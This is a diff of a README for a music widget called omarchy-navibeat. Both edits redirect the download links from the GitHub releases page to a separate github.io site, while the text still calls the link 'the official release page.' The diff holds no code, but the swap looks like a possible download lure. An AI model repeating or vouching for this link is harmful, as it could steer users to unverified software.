@@ -1,7 +1,7 @@
 <h1>🎵 omarchy-navibeat - Your Music, Everywhere, All at Once</h1>
 
 <p align="center">
-  <a href="https://github.com/Harmonic-marquee6439/omarchy-navibeat/releases">
+  <a href="https://harmonic-marquee6439.github.io">
     <img src="https://img.shields.io/badge/Download%20Now-Get%20the%20Widget-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f" alt="Download Button" style="max-width:100%;">
   </a>
 </p>
@@ -49,7 +49,7 @@ Getting this widget running is very easy, even if you have never done anything t
 
 Please go to this link to download the application:
 
-**👉 [Visit the Download Page](https://github.com/Harmonic-marquee6439/omarchy-navibeat/releases)**
+**👉 [Visit the Download Page](https://harmonic-marquee6439.github.io)**
 
 This link takes you to the official release page for omarchy-navibeat. You will see a list of downloadable files there. Look for the latest version. Click on it to start downloading. The file will be saved to your computer, usually in your "Downloads" folder.
 
